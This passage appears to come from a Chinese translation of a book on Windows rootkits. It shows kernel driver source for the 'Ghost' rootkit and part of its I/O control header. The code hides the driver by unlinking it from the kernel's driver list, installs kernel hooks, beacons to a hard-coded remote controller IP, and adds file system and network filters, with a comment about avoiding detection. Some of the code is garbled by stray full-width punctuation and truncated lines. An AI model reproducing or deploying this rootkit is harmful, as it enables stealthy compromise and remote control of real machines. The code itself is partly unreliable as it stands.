// Minor = 1: Windows XP
// Minor = 2: Windows Server 2003
if ( majorVersion == 5 && minorVersion == 2 )
{
DbgPrint("comint32: Running on Windows 2003");
}
else if ( majorVersion == 5 && minorVersion == 1 )
{
DbgPrint("comint32: Running on Windows XP");
}
else if ( majorVersion == 5 && minorVersion == 0 )
{
DbgPrint("comint32: Running on Windows 2000");
}
else if ( majorVersion == 4 && minorVersion == 0 )
{
DbgPrint("comint32: Running on Windows NT 4。0");
}
else
{
DbgPrint("comint32: Running on unknown system");
}
// Hide this driver
driverData = *((DRIVER_DATA**)((DWORD)pDriverObject + 20));
if( driverData != NULL )
{
// unlink this driver entry from the driver list
*((PDWORD)driverData->listEntry。Blink) = (DWORD)driverData->listEntry。Flink;
driverData->listEntry。Flink->Blink = driverData->listEntry。Blink;
}
// Get the remote controller's address and port
if( !NT_SUCCESS( Configure() ) )
{
DbgPrint("comint32: Configure failed");
return STATUS_UNSUCCESSFUL;
}
// Add kernel hooks
if( !NT_SUCCESS( HookKernel() ) )
{
DbgPrint("comint32: HookKernel failed");
return STATUS_UNSUCCESSFUL;
}
// Open the connection to remote controller
if( !NT_SUCCESS( OpenTDIConnection() ) )
{
DbgPrint("comint32: Could not open remote connection");
return STATUS_UNSUCCESSFUL;
}
// Tell remote controller that we're here
SendToRemoteController( "207。46。40。60" );
// Create the device controller
RtlInitUnicodeString( &deviceName， GHOST_DEVICE_CREATE_NAME );
IoCreateDevice( pDriverObject，
0，
&deviceName，
FILE_DEVICE_UNKNOWN，
0，
FALSE，
&pDeviceController );
RtlInitUnicodeString( &deviceLink， GHOST_DEVICE_LINK_NAME );
IoCreateSymbolicLink( &deviceLink， &deviceName );
// Route standard I/O through our dispatch routine
for(loop = 0; loop MajorFunction[loop] = OnDispatch;
// Route minimum fast I/O for file system filter
pFastIoDispatch = (PFAST_IO_DISPATCH)ExAllocatePool( NonPagedPool， sizeof(
FAST_IO_DISPATCH ) );
if( !pFastIoDispatch )
{
IoDeleteSymbolicLink( &deviceLink );
IoDeleteDevice( pDeviceController );
DbgPrint("comint32: Could not allocate FAST_IO_DISPATCH");
return STATUS_UNSUCCESSFUL;
}
RtlZeroMemory( pFastIoDispatch， sizeof( FAST_IO_DISPATCH ) );
pFastIoDispatch->SizeOfFastIoDispatch = sizeof(FAST_IO_DISPATCH);
pFastIoDispatch->FastIoDetachDevice = FastIoDetachDevice;
pFastIoDispatch->FastIoCheckIfPossible = FastIoCheckIfPossible;
pFastIoDispatch->FastIoRead = FastIoRead;
pFastIoDispatch->FastIoWrite = FastIoWrite;
pFastIoDispatch->FastIoQueryBasicInfo = FastIoQueryBasicInfo;
pFastIoDispatch->FastIoQueryStandardInfo = FastIoQueryStandardInfo;
pFastIoDispatch->FastIoLock = FastIoLock;
pFastIoDispatch->FastIoUnlockSingle = FastIoUnlockSingle;
pFastIoDispatch->FastIoUnlockAll = FastIoUnlockAll;
pFastIoDispatch->FastIoUnlockAllByKey = FastIoUnlockAllByKey;
pFastIoDispatch->FastIoDeviceControl = FastIoDeviceControl;
pFastIoDispatch->FastIoQueryNetworkOpenInfo = FastIoQueryNetworkOpenInfo;
pFastIoDispatch->MdlRead = FastIoMdlRead;
pFastIoDispatch->MdlReadComplete = FastIoMdlReadComplete;
pFastIoDispatch->PrepareMdlWrite = FastIoPrepareMdlWrite;
pFastIoDispatch->MdlWriteComplete = FastIoMdlWriteComplete;
pFastIoDispatch->FastIoReadCompressed = FastIoReadCompressed;
pFastIoDispatch->FastIoWriteCompressed = FastIoWriteCompressed;
pFastIoDispatch->MdlReadCompleteCompressed = FastIoMdlReadCompleteCompressed;
pFastIoDispatch->MdlWriteCompleteCompressed = FastIoMdlWriteCompleteCompressed;
pFastIoDispatch->FastIoQueryOpen = FastIoQueryOpen;
pDriverObject->FastIoDispatch = pFastIoDispatch;
// insert filters
if( !NT_SUCCESS( insertFileFilter( pDriverObject，
&oldFileSysDevice，
&newFileSysDevice，
L"\\DosDevices\\C:\\") ) )
DbgPrint("comint32: Could not insert file system filter");
if( !NT_SUCCESS( insertNetworkFilter( pDriverObject，
&oldNetworkDevice，
&newNetworkDevice，
L"\\Device\\Tcp") ) )
DbgPrint("comint32: Could not insert network filter");
// Comment out in free build to avoid detection
pDriverObject->DriverUnload = OnUnload;
return STATUS_SUCCESS;
}
IoManager
IoManager
IoManager
IoManager。hhhh
为了支持在 IoManager.c 里面实现的快速 I/O 调用，IoManager.h 增加了 22 个函数，一个宏
和 19 个定义。我们注意到在笫 5 章里面，和 rootkit 进行通信的程序在包含这个文件的时候
并 没 有 定 义 _GHOST_ROOTKIT_ ，
但 rootkit 在 包 含 这 个 文 件 之 前 必 须 要 先 定 义
_GHOST_ROOTKIT_ ：
// Copyright Ric Vieler， 2006
// Definitions for Ghost IO control
#ifndef _GHOST_IO_H_
#define _GHOST_IO_H_
// Use CreateFile( GHOST_DEVICE_OPEN_NAME，，， externally
// Use GHOST_DEVICE_CREATE_NAME internally to create device
// Use GHOST_DEVICE_LINK_NAME internally to create device link
#define GHOST_DEVICE_CREATE_NAME L"\\Device\\MyDeviceDriver"
#define GHOST_DEVICE_LINK_NAME L"\\DosDevices\\MyDeviceDriver"
#define GHOST_DEVICE_OPEN_NAME "\\\\。\\MyDeviceDriver"
// Set command = GHOST_ON or GHOST_OFF for GHOST_ON_OFF_COMMAND
// Get command = GHOST_ON or GHOST_OFF for GHOST_STATUS_COMMAND
typedef struct
{
int command;
} GHOST_IOCTLDATA;
// definitions from ntddk。h
// (these won't be defined in user mode apps)
#ifndef CTL_CODE
#define CTL_CODE( DeviceType， Function， Method， Access ) (
\
((DeviceType) SizeOfFastIoDispatch) >= \
(FIELD_OFFSET(FAST_IO_DISPATCH， _FieldName) + sizeof(void *))) && \
((_FastIoDispatchPtr)->_FieldName != NULL))
// Function types for filterFastIo
#define FIO_CHECK_IF_POSSIBLE
1
#define FIO_READ
2
#define FIO_WRITE
3
#define FIO_QUERY_BASIC_INFO
4
#define FIO_QUERY_STANDARD_INFO
5
#define FIO_LOCK
6
#define FIO_UNLOCK_SINGLE
7
#define FIO_UNLOCK_ALL
8
#define FIO_UNLOCK_ALL_BY_KEY
9
#define FIO_DEVICE_CONTROL
10
#define FIO_QUERY_NETWORK_OPEN_INFO
11
#define FIO_MDL_READ
12
#define FIO_MDL_READ_COMPLETE
13
#define FIO_PREPARE_MDL_WRITE
14
#define FIO_MDL_WRITE_COMPLETE
15
#define FIO_READ_COMPRESSED
16